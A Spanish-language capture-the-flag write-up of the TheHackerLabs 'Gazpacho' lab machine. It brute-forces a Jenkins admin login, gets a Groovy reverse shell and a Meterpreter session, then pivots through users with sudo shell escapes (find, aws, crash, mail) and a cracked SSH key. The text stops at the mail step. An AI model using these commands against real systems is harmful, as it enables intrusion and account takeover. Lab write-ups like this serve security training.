---
title: "Gazpacho - TheHackerLabs"
date: 2025-06-26
draft: false
slug: "THL-writeup-gazpacho"
excerpt: "Esta fue una máquina algo complicada, pues necesita bastante trabajo para terminarla. Después de analizar los escaneos y un login del puerto 80 que no lleva a nada, nos vamos a la página web del puerto 8080, que resulta ser el login del CI/CD Jenkins. Aplicamos fuerza bruta a este login y ganamos acceso al Dashboard de Jenkins. Abusamos de la Consola de Scripts para poder mandarnos una Reverse Shell de Groovy a nuestra máquina, obteniendo el acceso principal. Enumerando la máquina, descubrimos que hay 5 usuarios y que nuestro usuario actual, tiene privilegios para usar el binario find. Ocupamos la guía de GTFOBins para abusar de este binario y nos convertimos en el usuario 1. De aquí en adelante, ocuparemos mucho la guía de GTFOBins. El usuario 1, tiene privilegios para usar el binario aws, al que le aplicamos Shell Escape para convertirnos en el usuario 2. El usuario 2, tiene privilegios para usar el binario crash, al que también le aplicamos Shell Escape y nos convertimos en el usuario 3. El usuario 3, tiene privilegios para usar el binario cat, que ocupamos para leer la llave privada id_rsa del usuario 4. La crackeamos y ganamos acceso vía SSH como el usuario 4. El usuario 4, tiene privilegios para usar el binario mail, que ocupamos para convertirnos en el usuario 5. El usuario 5, tiene privilegios para usar el binario bettercap como Root. Al ejecutar bettercap como Root, nos da una terminal con la que podemos ejecutar comandos como si fuéramos el usuario Root, lo que nos permite darle permisos SUID a la Bash, para que cualquier usuario pueda utilizarla con privilegios y ser Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "Web Enumeration", "CI/CD Jenkins", "Brute Force Attack", "Jenkins Script Console Abuse", "Abusing Sudoers Privileges", "User Pivoting", "Shell Escape", "Cracking Hash", "Cracking SSH Private Key", "Privesc - Abusing Sudoers Privileges", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: auxiliary/scanner/http/jenkins_login"
  - "wget"
  - "python3"
  - "chmod"
  - "python"
  - "nc"
  - "Módulo: exploit/multi/http/jenkins_script_console"
  - "cat"
  - "grep"
  - "which"
  - "hostname"
  - "sudo"
  - "find"
  - "aws"
  - "crash"
  - "ssh2john"
  - "JohnTheRipper"
  - "ssh"
  - "nano"
  - "whoami"
  - "mail"
  - "bettercap"
  - "Bash"
links:
  - "https://www.hackingarticles.in/jenkins-penetration-testing/"
  - "https://pentest-tools.com/vs/brute-force-dev-ci-cd-apps"
  - "https://github.com/blu3ming/Jenkins-Brute-Force"
  - "https://www.revshells.com/"
  - "https://gtfobins.github.io/gtfobins/find/"
  - "https://gtfobins.github.io/gtfobins/aws/"
  - "https://gtfobins.github.io/gtfobins/crash/"
  - "https://gtfobins.github.io/gtfobins/cat/"
  - "https://gtfobins.github.io/gtfobins/mail/"
  - "https://www.bettercap.org/legacy/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-gazpacho/gazpacho.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.150
PING 192.168.10.150 (192.168.10.150) 56(84) bytes of data.
64 bytes from 192.168.10.150: icmp_seq=1 ttl=64 time=8.79 ms
64 bytes from 192.168.10.150: icmp_seq=2 ttl=64 time=1.28 ms
64 bytes from 192.168.10.150: icmp_seq=3 ttl=64 time=1.35 ms
64 bytes from 192.168.10.150: icmp_seq=4 ttl=64 time=1.70 ms

--- 192.168.10.150 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3062ms
rtt min/avg/max/mdev = 1.278/3.278/8.787/3.184 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.150 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 13:51 CST
Initiating ARP Ping Scan at 13:51
Scanning 192.168.10.150 [1 port]
Completed ARP Ping Scan at 13:51, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:51
Scanning 192.168.10.150 [65535 ports]
Discovered open port 80/tcp on 192.168.10.150
Discovered open port 8080/tcp on 192.168.10.150
Discovered open port 22/tcp on 192.168.10.150
Completed SYN Stealth Scan at 13:51, 9.97s elapsed (65535 total ports)
Nmap scan report for 192.168.10.150
Host is up, received arp-response (0.00093s latency).
Scanned at 2025-06-26 13:51:46 CST for 10s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds
           Raw packets sent: 74594 (3.282MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos. Tenemos dos páginas web activas, lo que es interesante.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,8080 192.168.10.150 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 13:52 CST
Nmap scan report for 192.168.10.150
Host is up (0.00089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))

|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Login
8080/tcp open  http    Jetty 10.0.20

|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

De acuerdo al escaneo, la página web del **puerto 80** está mostrando un login y la página web del **puerto 8080**, no muestra algo como tal, pero el servidor **Jetty**, pertenece al **CI/CD Jenkins**.

Primero, veamos qué podemos hacer en el login.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura1.png">
</p>

Es un login simple.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura2.png">
</p>

Nada como tal.

Si probamos el login, metiendo cualquier usuario y contraseña, obtendremos esta respuesta:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura3.png">
</p>

Esto me da a entender que no está funcionando bien el servidor o que existe un error que provoca el fallo del login.

Podríamos aplicar **Fuzzing** para buscar si existe algún directorio o archivo oculto, pero no encontraremos nada.

Entonces, vayamos a ver la página web del **puerto 8080** que utiliza **Jenkins**.

### Analizando Página Web Activa en el Puerto 8080 {#Jenkins}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura4.png">
</p>

Estamos en el login del **CI/CD Jenkins**.

Con **whatweb**, podemos obtener la versión de **Jenkins** que se está usando:
```bash
hatweb http://192.168.10.150:8080
http://192.168.10.150:8080 [403 Forbidden] Cookies[JSESSIONID.3d4df755], Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.20)], HttpOnly[JSESSIONID.3d4df755], IP[192.168.10.150], Jenkins[2.440.3], Jetty[10.0.20], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://192.168.10.150:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.3d4df755], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.20)], HttpOnly[JSESSIONID.3d4df755], IP[192.168.10.150], Jenkins[2.440.3], Jetty[10.0.20], PasswordField[j_password], Script[application/json,text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```
Parece que está usando la **versión 2.440.3**.

Aquí no podremos hacer mucho, pero necesitamos entrar a ese login.

Entonces, es hora de aplicar fuerza bruta.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a Login de Jenkins {#fuerzaBruta}

Sabemos que existe un usuario por defecto en **Jenkins**, que es el **usuario admin**.

Pero no sabemos su contraseña, entonces, lo ideal es aplicar fuerza bruta para descubrir la contraseña.

Lo haremos con dos herramientas:
* Metasploit Framework: Módulo `auxiliary/scanner/http/jenkins_login`
* Script de GitHub

Esta vez, no utilizaremos la herramienta **hydra** porque existe un problema con el endpoint al que va la data enviada del login de **Jenkins**.

No encontré el problema como tal, pero parece que el endpoint `/j_spring_security_check`, que es de versiones actuales de **Jenkins**, crea problemas de pérdida de data con **hydra**, es decir, lo que envía **hydra** no lo recibe el login de **Jenkins**, o da falsos positivos, aunque al menos es lo que logré notar.

En cambio, el endpoint `/j_acegi_security_check`, que es de versiones antiguas al 2012, sí se le puede aplicar fuerza bruta con **hydra**.

#### Aplicando Fuerza Bruta con Módulo jenkins_login de Metasploit Framework {#Metasploit}

Inicia **Metasploit Framework** y escoge el módulo `auxiliary/scanner/http/jenkins_login`:
```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use auxiliary/scanner/http/jenkins_login
msf6 auxiliary(scanner/http/jenkins_login) >
```

Configura el módulo:
```bash
msf6 auxiliary(scanner/http/jenkins_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/http/jenkins_login) > set RHOSTS 192.168.10.150
RHOSTS => 192.168.10.150
msf6 auxiliary(scanner/http/jenkins_login) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(scanner/http/jenkins_login) > set TARGETURI /
TARGETURI => /
msf6 auxiliary(scanner/http/jenkins_login) > set VERBOSE false
VERBOSE => false
```

Ejecuta el módulo:
```bash
msf6 auxiliary(scanner/http/jenkins_login) > exploit
[+] 192.168.10.150:8080 - Login Successful: admin:12345
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Una contraseña bastante simple.

Probémosla:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura5.png">
</p>

Estamos dentro.

#### Aplicando Fuerza Bruta con Script de GitHub {#exploit}

Buscando un poco, encontré un script de un usuario de **GitHub** que aplica fuerza bruta al login de **Jenkins**:
* <a href="https://github.com/blu3ming/Jenkins-Brute-Force" target="_blank">Repositorio de blu3ming: Jenkins-Brute-Force</a>

Vamos a descargarlo:
```bash
wget https://raw.githubusercontent.com/blu3ming/Jenkins-Brute-Force/refs/heads/main/jenkins-brute-force.py
```

Necesitaremos tener instalado el módulo **pwntools** en nuestra máquina, te recomiendo instalarlo en un entorno virtual:
```bash
python3 -m venv env
source env/bin/activate
pip install pwntools
```

Veamos cómo funciona:
```bash
chmod +x jenkins-brute-force.py
python jenkins-brute-force.py
[*] Uso: python jenkins-brute-force.py <IP> <PORT> <WORDLIST> <USER>
[*] Ejemplo: python jenkins-brute-force.py 10.10.20.30 8080 rockyou.txt admin
```
Tenemos que indicarle la IP, el puerto donde está la página, el wordlist a usar y un usuario.

Probémoslo:
```bash
python jenkins-brute-force.py 192.168.10.150 8080 /usr/share/wordlists/rockyou.txt admin
[▖] Buscando contrasena...: [1] admin:123456
[▁] Probando...
[*] Credenciales validas admin:123456
```
Excelente, funcionó bien y obtuvimos la misma respuesta.

Continuemos.

### Abusando de Jenkins para Ganar Acceso a la Máquina Víctima {#abusoJenkins}

Podemos aprovecharnos de la **consola de scripts de Jenkins**, para poder ejecutar una **Reverse Shell** de **Groovy**.

También podemos ocupar un módulo de **Metasploit Framework** con el que podemos obtener una sesión de **Meterpreter**.

Apliquemos ambas.

#### Obteniendo Reverse Shell de Forma Manual desde la Consola de Scripts de Jenkins {#revShellJenkins}

Aquí te dejo un blog que explica como abusar de la **Consola de Scripts** para ejecutar comandos:
* <a href="https://www.hackingarticles.in/jenkins-penetration-testing/" target="_blank">Jenkins Penetration Testing</a>

Podemos ir directamente a la **Consola de Scripts** si ponemos la siguiente ruta en la URL `/manage/script`:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura6.png">
</p>

Pero, también podemos ir a la sección **Manage Jenkins**:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura7.png">
</p>

Vamos hasta la parte de abajo en **Tools and Actions** y seleccionamos **Script Console**:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura8.png">
</p>

Y llegamos de nuevo a la **Consola de Scripts**:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura6.png">
</p>

Desde ahí, utilizamos una **Reverse Shell de Groovy** que podemos obtener de la siguiente página web:
* <a href="https://www.revshells.com/" target="_blank">Reverse Shell Generator</a>

Se debe ver así:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura9.png">
</p>

La copiamos y pegamos en la consola.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```
Y ejecuta el script.

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.150] 58542

whoami
jenkins
```
Estamos dentro.

Obtén una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```

#### Obteniendo Sesión de Meterpreter con Módulo jenkins_script_console de Metasploit Framework {#Meterpreter}

Como ya tenemos una sesión activa, tan solo tenemos que seleccionar el módulo:
```bash
msf6 auxiliary(scanner/http/jenkins_login) > use exploit/multi/http/jenkins_script_console
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(multi/http/jenkins_script_console) >
```

Ahora lo configuramos:
```bash
msf6 exploit(multi/http/jenkins_script_console) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/jenkins_script_console) > set PASSWORD 12345
PASSWORD => 12345
msf6 exploit(multi/http/jenkins_script_console) > set RHOSTS 192.168.10.150
RHOSTS => 192.168.10.150
msf6 exploit(multi/http/jenkins_script_console) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/jenkins_script_console) > set TARGETURI /
TARGETURI => /
msf6 exploit(multi/http/jenkins_script_console) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/jenkins_script_console) > set target 1
target => 1
```

Y lo ejecutamos:
```bash
msf6 exploit(multi/http/jenkins_script_console) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Checking access to the script console
[*] Logging in...
[*] Using CSRF token: 'bf5c66959eb1d8340b4c658203e7238852598b5375f2ac92319935694394d8c3' (Jenkins-Crumb style v2)
[*] 192.168.10.150:8080 - Sending Linux stager...
[*] Sending stage (3045380 bytes) to 192.168.10.150
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.10.150:39990) at 2025-06-27 00:41:55 -0600

meterpreter > getuid
Server username: jenkins
meterpreter > sysinfo
Computer     : 192.168.10.150
OS           : Debian 12.5 (Linux 6.1.0-18-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
Genial, estamos dentro otra vez.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima {#linEnum}

Veamos cuántos usuarios existen:
```bash
jenkins@gazpacho:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
pimiento:x:1001:1001::/home/pimiento:/bin/bash
cebolla:x:1002:1002::/home/cebolla:/bin/bash
tomate:x:1003:1003::/home/tomate:/bin/bash
ajo:x:1004:1004::/home/ajo:/bin/bash
pepino:x:1005:1005::/home/pepino:/bin/bash
jenkins:x:103:112:Jenkins,,,:/var/lib/jenkins:/bin/bash
```
Tenemos 5 usuarios.

Podemos ver sus directorios en el directorio `/home`:
```bash
jenkins@gazpacho:~$ ls -la /home
total 32
drwxr-xr-x  8 root     root     4096 abr 29  2024 .
drwxr-xr-x 18 root     root     4096 abr 29  2024 ..
drwxr-xr-x  2 ajo      ajo      4096 abr 29  2024 ajo
drwxr-xr-x 16 root     root     4096 abr 29  2024 bettercap
drwxr-xr-x  2 cebolla  cebolla  4096 abr 29  2024 cebolla
drwxr-xr-x  4 pepino   pepino   4096 abr 29  2024 pepino
drwxr-xr-x  2 pimiento pimiento 4096 abr 29  2024 pimiento
drwxr-xr-x  2 tomate   tomate   4096 abr 29  2024 tomate
```
Parece que hay otro directorio ahí.

Al revisarlo, parece ser un binario que ya fue compilado, y vemos ahí que hay un **Dockerfile**, por lo que es posible que exista un contenedor de **Docker**:
```bash
jenkins@gazpacho:~$ ls -la /home/bettercap/
total 33404
drwxr-xr-x 16 root root     4096 abr 29  2024 .
drwxr-xr-x  8 root root     4096 abr 29  2024 ..
-rwxr-xr-x  1 root root 34024856 abr 29  2024 bettercap
-rw-r--r--  1 root root      356 abr 29  2024 bettercap.service
drwxr-xr-x  2 root root     4096 abr 29  2024 builder
-rwxr-xr-x  1 root root     4054 abr 29  2024 build.sh
drwxr-xr-x  2 root root     4096 abr 29  2024 caplets
drwxr-xr-x  2 root root     4096 abr 29  2024 core
-rw-r--r--  1 root root      853 abr 29  2024 Dockerfile
drwxr-xr-x  2 root root     4096 abr 29  2024 firewall
drwxr-xr-x  8 root root     4096 abr 29  2024 .git
drwxr-xr-x  2 root root     4096 abr 29  2024 .github
-rw-r--r--  1 root root      137 abr 29  2024 .gitignore
-rw-r--r--  1 root root     2274 abr 29  2024 go.mod
-rw-r--r--  1 root root    17226 abr 29  2024 go.sum
-rw-r--r--  1 root root     1171 abr 29  2024 ISSUE_TEMPLATE.md
drwxr-xr-x  2 root root     4096 abr 29  2024 js
-rw-r--r--  1 root root    35187 abr 29  2024 LICENSE.md
drwxr-xr-x  2 root root     4096 abr 29  2024 log
-rw-r--r--  1 root root     2767 abr 29  2024 main.go
-rw-r--r--  1 root root      950 abr 29  2024 Makefile
drwxr-xr-x 33 root root     4096 abr 29  2024 modules
drwxr-xr-x  2 root root     4096 abr 29  2024 network
-rw-r--r--  1 root root     1693 abr 29  2024 openwrt.makefile
drwxr-xr-x  2 root root     4096 abr 29  2024 packets
-rw-r--r--  1 root root     2977 abr 29  2024 README.md
-rwxr-xr-x  1 root root      223 abr 29  2024 release.stork
drwxr-xr-x  2 root root     4096 abr 29  2024 routing
-rw-r--r--  1 root root      417 abr 29  2024 SECURITY.md
drwxr-xr-x  2 root root     4096 abr 29  2024 session
drwxr-xr-x  2 root root     4096 abr 29  2024 tls
-rw-r--r--  1 root root     5416 abr 29  2024 .travis.yml
```

Podemos comprobar que está **Docker** instalado en la máquina:
```bash
jenkins@gazpacho:~$ which docker
/usr/bin/docker
jenkins@gazpacho:~$ hostname -I
192.168.10.150 172.17.0.1 2806:...
```

Pero si aplicamos **Ping Sweep** con el siguiente one-liner, no encontraremos ningún contenedor creado:
```bash
jenkins@gazpacho:~$ for i in $(seq 254); do ping 172.17.0.$i -c1 -W1 & done | grep from
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.026 ms
```

Si revisamos los directorios de los usuarios, encontraremos algo interesante en el directorio del **usuario pepino**:
```bash
jenkins@gazpacho:~$ ls -la /home/pepino/
total 28
drwxr-xr-x 4 pepino pepino 4096 abr 29  2024 .
drwxr-xr-x 8 root   root   4096 abr 29  2024 ..
lrwxrwxrwx 1 root   root      9 abr 29  2024 .bash_history -> /dev/null
-rw-r--r-- 1 pepino pepino  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 pepino pepino 3526 abr 23  2023 .bashrc
drwxr-xr-x 3 pepino pepino 4096 abr 28  2024 .local
-rw-r--r-- 1 pepino pepino  807 abr 23  2023 .profile
drwx------ 2 pepino pepino 4096 abr 28  2024 .ssh
```
Mucho ojo con ese directorio `.ssh`, pues puede haber una **llave privada id_rsa** ahí.

Y del **usuario tomate**:
```bash
jenkins@gazpacho:~$ ls -la /home/tomate/
total 24
drwxr-xr-x 2 tomate tomate 4096 abr 29  2024 .
drwxr-xr-x 8 root   root   4096 abr 29  2024 ..
lrwxrwxrwx 1 root   root      9 abr 29  2024 .bash_history -> /dev/null
-rw-r--r-- 1 tomate tomate  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 tomate tomate 3526 abr 23  2023 .bashrc
-rw-r--r-- 1 tomate tomate  807 abr 23  2023 .profile
-r-------- 1 root   root     33 abr 29  2024 user.txt
```
Ahí tenemos la flag del usuario.

### Abusando de Privilegios Sobre Binario find para Escalar Privilegios y Convertirnos en el Usuario ajo {#find}

Revisando los privilegios del **usuario jenkins**, podemos usar el comando **find** como el **usuario ajo**:
```bash
jenkins@gazpacho:~$ sudo -l
Matching Defaults entries for jenkins on gazpacho:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jenkins may run the following commands on gazpacho:
    (ajo) NOPASSWD: /usr/bin/find
```

Podemos buscar una forma de escalar privilegios con el **binario find**, para convertirnos en el **usuario ajo** con la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/find/" target="_blank">GTFOBins: find</a>

Ocuparemos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura10.png">
</p>

Probémoslo:
```bash
jenkins@gazpacho:~$ sudo -u ajo find . -exec /bin/bash \; -quit
ajo@gazpacho:/var/lib/jenkins$ whoami
ajo
ajo@gazpacho:/var/lib/jenkins$ cd /home/ajo
ajo@gazpacho:~$
```
Ahora somos el **usuario ajo**.

### Abusando de Privilegios Sobre Binario aws para Escalar Privilegios (Shell Escape) y Convertirnos en el Usuario cebolla {#aws}

Este usuario no cuenta con algún archivo o pista dentro de su directorio.

Entonces, revisemos sus privilegios:
```bash
ajo@gazpacho:~$ sudo -l
Matching Defaults entries for ajo on gazpacho:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ajo may run the following commands on gazpacho:
    (cebolla) NOPASSWD: /usr/bin/aws
```

Busquemos en la **guía de GTFOBins** cómo podemos abusar del **binario aws**, para escalar privilegios y convertirnos en el **usuario cebolla**:
* <a href="https://gtfobins.github.io/gtfobins/aws/" target="_blank">GTFOBins: aws</a>

Ocuparemos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura11.png">
</p>

Vamos a aplicar un **Shell Escape**.

Usa el comando:
```bash
ajo@gazpacho:~$ sudo -u cebolla aws help
```

Ahora escapemos del manual de ayuda:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura12.png">
</p>

Observa la terminal:
```bash
cebolla@gazpacho:/home/ajo$ 
cebolla@gazpacho:/home/ajo$ whoami
cebolla
cebolla@gazpacho:/home/ajo$ cd ../cebolla/
cebolla@gazpacho:~$
```
Ya somos el **usuario cebolla**.

### Abusando de Privilegios Sobre Binario crash para Escalar Privilegios (Shell Escape) y Convertirnos en el Usuario pimiento {#crash}

Este usuario tampoco tiene alguna pista o algo que nos ayude.

Veamos qué privilegios tiene:
```bash
cebolla@gazpacho:~$ sudo -l
Matching Defaults entries for cebolla on gazpacho:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cebolla may run the following commands on gazpacho:
    (pimiento) NOPASSWD: /usr/bin/crash
```

Busquemos en la **guía de GTFOBins** cómo podemos abusar del **binario crash**, para escalar privilegios y convertirnos en el **usuario pimiento**:
* <a href="https://gtfobins.github.io/gtfobins/crash/" target="_blank">GTFOBins: crash</a>

Ocuparemos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura13.png">
</p>

Aplicaremos otra vez un **Shell Escape**.

Primero, usemos el comando que nos meterá a un manual:
```bash
cebolla@gazpacho:~$ sudo -u pimiento crash -h
```

Ahora, escapemos del manual de ayuda:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura14.png">
</p>

Observa la terminal:
```bash
pimiento@gazpacho:/home/cebolla$ 
pimiento@gazpacho:/home/cebolla$ whoami
pimiento
pimiento@gazpacho:/home/cebolla$ cd ../pimiento/
pimiento@gazpacho:~$
```
Ahora somos el **usuario pimiento**.

### Abusando de Privilegios Sobre Binario cat para Escalar Privilegios (Crackeo de Llave Privada SSH) y Convertirnos en el Usuario pepino {#cat}

Este usuario tampoco tiene algo que nos ayude.

Veamos qué privilegios tiene:
```bash
pimiento@gazpacho:~$ sudo -l
Matching Defaults entries for pimiento on gazpacho:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pimiento may run the following commands on gazpacho:
    (pepino) NOPASSWD: /usr/bin/cat
```

Busquemos en la **guía de GTFOBins** cómo podemos abusar del **binario cat**, para escalar privilegios y convertirnos en el **usuario pepino**:
* <a href="https://gtfobins.github.io/gtfobins/cat/" target="_blank">GTFOBins: cat</a>

Ocuparemos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura15.png">
</p>

Podemos abusar del **binario cat** para leer los archivos que solo el **usuario pepino** pueda leer.

Si recordamos el contenido del directorio del **usuario pepino**, vimos que hay un directorio `.ssh`, por lo que es posible que exista la **llave privada id_rsa**.

Vamos a comprobarlo:
```bash
pimiento@gazpacho:~$ LFILE=/home/pepino/.ssh/id_rsa
pimiento@gazpacho:~$ sudo -u pepino cat "$LFILE"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0...
...
```
Sí existe y la obtuvimos.

Cópiala y guárdala en tu máquina como **id_rsa** y dale los permisos correctos de ejecución para esa llave:
```bash
nano id_rsa
chmod 600 id_rsa
```

Para poder crackear esta llave, necesitamos obtener el hash con la herramienta **ssh2john**:
```bash
ssh2john id_rsa > hash
```

Y ahora, utilizamos **JohnTheRipper** para crackear el hash:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mittens          (id_rsa)     
1g 0:00:01:11 DONE (2025-06-26 17:56) 0.01392g/s 35.42p/s 35.42c/s 35.42C/s shamrock..12344321
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la frase usada en la **llave privada id_rsa**.

Con esto, podemos autenticarnos en la máquina víctima vía **SSH** utilizando la misma llave y la frase obtenida:
```bash
ssh -i id_rsa pepino@192.168.10.150
Enter passphrase for key 'id_rsa': 
Linux gazpacho 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
...
Last login: Fri Jun 27 00:46:24 2025
pepino@gazpacho:~$ whoami
pepino
```
Ahora somos el **usuario pepino**.

### Abusando de Privilegios Sobre Binario mail para Escalar Privilegios y Convertirnos en el Usuario tomate {#mail}

Este usuario tampoco tiene algún archivo o pista que nos ayude.

Veamos qué privilegios tiene:
```bash
pepino@gazpacho:~$ sudo -l
Matching Defaults entries for pepino on gazpacho:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pepino may run the following commands on gazpacho:
    (tomate) NOPASSWD: /usr/bin/mail
```

Busquemos en la **guía de GTFOBins** cómo podemos abusar del **binario mail**, para escalar privilegios y convertirnos en el **usuario tomate**:
* <a href="https://gtfobins.github.io/gtfobins/mail/" target="_blank">GTFOBins: mail</a>

Ocuparemos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-gazpacho/Captura16.png">
</p>

Probémoslo:
```bash
pepino@gazpacho:~$ sudo -u tomate mail --exec='!/bin/bash'
